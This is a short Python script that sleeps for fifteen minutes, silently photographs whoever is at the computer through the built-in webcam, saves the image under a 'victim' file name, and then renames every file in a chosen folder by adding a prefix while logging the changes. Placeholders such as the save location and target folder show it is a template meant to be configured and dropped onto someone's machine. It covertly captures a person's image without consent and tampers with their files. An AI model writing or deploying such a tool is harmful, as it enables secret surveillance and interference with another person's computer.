import os, datetime, time, cv2 # os for rename / datetime for time in log / time for delayed start / cv2 to take photo
from glob import glob

def photo() -> None:
    index: int = 0 # For photo number
    cam_port = 0 # Get build in camera port
    cam = cv2.VideoCapture(cam_port) # Get camera

    result, image = cam.read() # Take photo

    photos: list[str] = glob('!saveLocation!') # Get list of photos
    for i in photos: # Count photos
        index += 1

    if result:
        cv2.imwrite(f'!saveLocation\\victim{index - 1}.png!', image) # Save photo

def log(fromName: str, toName: str) -> None:
    logFile: str = '!saveLocation\\log.log!' # Log file location

    with open(logFile, 'a') as file:
        now = datetime.datetime.now() # Get time
        file.write(f'\'{now}\' Log: Change name from {fromName} to {toName}\n') # Write single log

def rename() -> None:
    path: list[str] = glob('!targetFolder!') # Give path
    photo()

    for file in path: # Literate through files
        if file[17:24] == '!PharseToAdd!': # Check if file have already prefix '!PharseToAdd!'
            continue
        newName: list[str] = f'{file[:17]}!PharseToAdd! {file[17:]}' # Make name with prefix
        os.rename(file, newName) # Apply prefix
        log(file, newName) # Write log

def main() -> None:
    rename()

if __name__ == '__main__':
    time.sleep(900) # Set time as you need
    main()